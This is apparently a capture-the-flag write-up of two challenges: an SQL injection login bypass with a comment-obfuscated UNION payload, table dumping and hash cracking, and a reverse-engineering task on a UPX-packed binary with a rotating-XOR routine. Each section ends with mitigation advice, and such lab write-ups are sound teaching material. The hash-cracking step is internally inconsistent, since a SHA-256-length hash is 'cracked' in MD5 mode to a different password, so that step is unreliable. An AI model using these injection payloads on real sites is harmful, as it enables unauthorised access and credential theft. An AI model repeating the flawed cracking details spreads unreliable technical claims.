SQL Injection Master

Medium Web Exploitation 500 pts

A classic SQL injection challenge with multiple layers of protection including WAF filtering and prepared statement bypasses. This writeup demonstrates advanced union-based extraction techniques.

Methodology

Step 1: Reconnaissance

Initial enumeration revealed a login form with potential SQL injection points.

$ curl -X POST http://target.com/login \
  -d "username=admin&password=test'"
Error: SQL syntax error near 'admin' at line 1
Step 2: WAF Bypass

The application employed keyword filtering. Used comment-based bypass techniques.

payload = "admin'/**/UNION/**/SELECT/**/1,2,3--"
Successful bypass - 3 columns detected
Step 3: Information Extraction

Extracted database schema and located the admin credentials table.

$ python sqli_extract.py -t http://target.com/login \
  --dump-tables --threads 10
Found table: admin_users
Found table: session_tokens
Found table: audit_logs
Step 4: Privilege Escalation

Used UNION SELECT to extract admin hash and cracked it offline.

extracted_hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
$ hashcat -a 0 -m 0 hash.txt rockyou.txt
Cracked: password123
FLAG: CTF{sql_1nj3ct10n_m4st3r_2024}

Mitigation Strategies

  • Implement parameterized queries/prepared statements
  • Use proper input validation and sanitization
  • Apply principle of least privilege for database accounts
  • Deploy application-layer firewalls with strict SQL injection rules

Binary Secrets

Hard Reverse Engineering 750 pts

Advanced reverse engineering challenge involving anti-debugging techniques, packed executables, and custom encryption algorithms. Required dynamic analysis and cryptographic understanding.

Analysis Workflow

Step 1: Static Analysis

Initial examination revealed a packed binary with anti-debugging measures.

$ file challenge.exe
PE32 executable, UPX packed
$ strings challenge.exe | grep -i flag
No obvious strings found
Step 2: Unpacking

Used manual unpacking techniques after UPX failed due to modifications.

# Set breakpoint at OEP in x64dbg
bp 0x401000
Breakpoint set successfully
# Dump unpacked code section
Successfully extracted unpacked binary
Step 3: Algorithm Reverse Engineering

Discovered custom XOR encryption with rotating key mechanism.

def decrypt_flag(encrypted_data, key_base):
        result = ""
        for i, byte in enumerate(encrypted_data):
            key = (key_base + i * 7) % 256
            result += chr(byte ^ key)
        return result
Step 4: Key Recovery

Used known plaintext attack to recover the base key value.

$ python3 key_recovery.py
Testing key_base values...
Found valid key_base: 0x42
Decrypted flag: CTF{r3v3rs3_3ng1n33r1ng_n1nj4}
FLAG: CTF{r3v3rs3_3ng1n33r1ng_n1nj4}

Security Insights

  • Custom encryption algorithms are often weaker than established standards
  • Obfuscation techniques delay but don't prevent determined analysis
  • Known plaintext attacks are effective against weak encryption schemes
  • Use proven cryptographic libraries instead of rolling your own
